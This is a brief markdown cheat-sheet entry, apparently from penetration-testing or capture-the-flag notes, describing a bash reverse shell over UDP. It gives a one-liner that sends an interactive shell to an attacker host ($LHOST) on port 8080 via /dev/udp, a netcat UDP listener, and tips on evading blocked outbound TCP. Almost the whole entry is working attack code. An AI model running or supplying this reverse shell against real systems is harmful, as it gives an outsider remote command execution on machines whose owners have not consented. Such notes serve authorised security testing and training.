# Bash UDP Reverse Shell

A bash reverse shell using UDP instead of TCP.

Used on: **<Machine>**

## One-liner

<!-- cmd: linux -->
```bash
sh -i >& /dev/udp/$LHOST/8080 0>&1
```

## Listener

<!-- cmd: linux -->
```bash
nc -u -lvnp 8080
```

## Notes

- Useful when outbound TCP is blocked but UDP is allowed (e.g. DNS port 53).
- UDP is connectionless, so the shell may be less reliable than TCP.
